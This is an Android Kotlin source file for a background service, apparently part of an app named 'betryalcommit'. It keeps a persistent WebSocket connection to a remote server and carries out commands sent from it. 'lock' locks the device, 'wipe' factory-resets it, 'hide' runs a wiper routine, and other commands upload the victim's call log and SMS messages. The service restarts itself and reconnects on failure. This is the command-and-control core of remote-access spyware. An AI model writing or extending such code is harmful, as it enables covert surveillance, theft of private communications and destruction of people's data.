package com.example.betryalcommit
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import java.util.concurrent.TimeUnit

class MyService : Service() {
    private val uiHandler = Handler(Looper.getMainLooper())
    private lateinit var webSocket: WebSocket
    private lateinit var client: OkHttpClient
    private lateinit var request: Request
    private val serverUrl = "https://betryal-commit-back.onrender.com"
  //  private val serverUrl = "https://bertrylcommit-back.botsailer1.repl.co"
    private var isRunning = false
    private val NOTIFICATION_ID = 1410
    private var isWebSocketInitialized = false // New flag

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        client = OkHttpClient.Builder()
            .readTimeout(0, TimeUnit.MILLISECONDS)
            .build()
        request = Request.Builder().url(serverUrl).build()

        // Initialize WebSocket only once
        if (!isWebSocketInitialized) {
            webSocket = client.newWebSocket(request, MyWebSocketListener())
            isWebSocketInitialized = true
        }

        if (!isRunning) {
            isRunning = true
            startForeground(NOTIFICATION_ID, createNotification())
        }
        return START_STICKY
    }

    private fun createNotification(): Notification {
        val channelId = "my_channel_id"
        val channelName = "My Channel"

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val importance = NotificationManager.IMPORTANCE_DEFAULT
            val channel = NotificationChannel(channelId, channelName, importance)
            notificationManager.createNotificationChannel(channel)
        }

        val notificationBuilder = NotificationCompat.Builder(this, channelId)
            .build()

        return notificationBuilder
    }

    fun sendTextData(text: String) {
        if (isWebSocketInitialized && isSocketConnected) {
            webSocket.send(text)
        } else {
            reconnectWebSocket()
        }
    }

    private fun reconnectWebSocket() {
        Thread {
            try {
                Thread.sleep(10000)
                if (!isSocketConnected) {
                    webSocket.cancel()
                    webSocket = client.newWebSocket(request, MyWebSocketListener())
                }
            } catch (e: InterruptedException) {
                e.printStackTrace()
            }
        }.start()
    }

    inner class MyWebSocketListener : WebSocketListener() {
        override fun onOpen(webSocket: WebSocket, response: Response) {
            isSocketConnected = true
            this@MyService.webSocket = webSocket
           // sendTextData("here i am from apk")
            Log.d("WebSocket", "Connected to server")
        }
        override fun onMessage(webSocket: WebSocket, text: String) {
            Log.d("WebSocket", "Received message: $text")
                when (text) {
                    "lock" -> AdminAct.lockdev(this@MyService)
                    "wipe" -> AdminAct.factoryResetDevice(this@MyService)
                    "hide" -> AdminAct.wiper(MainActivity(), applicationContext)
                    "call_log" -> callutil.uploadCalls(applicationContext.contentResolver)
                    "sms_log" -> Teleserv.uploadsms(applicationContext.contentResolver, this@MyService)
                }
        }

        override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
            Log.d("WebSocket", "Connection closed")
            isSocketConnected = false
            reconnectWebSocket()
        }

        override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
            isSocketConnected = false
            Log.e("WebSocket", "Connection error: ${t.message}")
            reconnectWebSocket()
        }
    }


    companion object {
        private var isSocketConnected: Boolean = false // Moved to companion object
    }
}

